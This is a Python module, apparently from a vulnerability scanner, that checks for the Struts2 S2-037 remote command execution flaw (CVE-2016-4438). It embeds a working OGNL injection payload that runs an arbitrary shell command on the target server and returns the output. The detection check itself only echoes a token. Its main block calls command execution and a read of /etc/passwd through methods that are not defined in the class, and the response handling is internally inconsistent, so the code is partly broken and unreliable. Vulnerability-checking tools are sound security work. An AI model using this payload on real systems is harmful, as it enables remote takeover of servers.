#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_037_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2016-4438',
            'description': 'Struts2 S2-037漏洞可执行任意命令, 影响范围为: Struts 2.3.20 - Struts Struts 2.3.28.1',
            'date': '2016-06-06',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.payload = '''/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command='''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.payload + 'echo ' + self.capta, headers = self.headers)
            if self.capta in check_req.text and len(await check_req.text()) < 100:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_037 = S2_037_BaseVerify('http://127.0.0.1:8080/S2-037/orders/3')
    S2_037.cmd('id')
    S2_037.read('/etc/passwd')
